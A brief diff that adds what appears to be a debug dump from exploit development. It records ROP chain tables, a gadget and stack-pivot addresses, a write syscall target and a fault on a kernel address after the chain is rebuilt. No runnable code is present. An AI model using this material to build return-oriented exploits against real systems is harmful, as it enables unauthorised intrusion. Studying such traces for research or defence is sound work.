@@ -1,0 +1,8 @@
+=== PROBE 993a: SIGINFO DUMP ===
+
+[A] pid=108
+[B] ropchain=table signal=table gadgets=table
+[C] gadget=0xAAB98F4 pivot=0xFB0000BD base=0xFB000000
+[D] write.fn_addr=0x816EF8B57 write.no=0x4
+[E] fd_addr=0x311553D80 holds=21
+[F] chain rebuilt, faulting on a kernel address
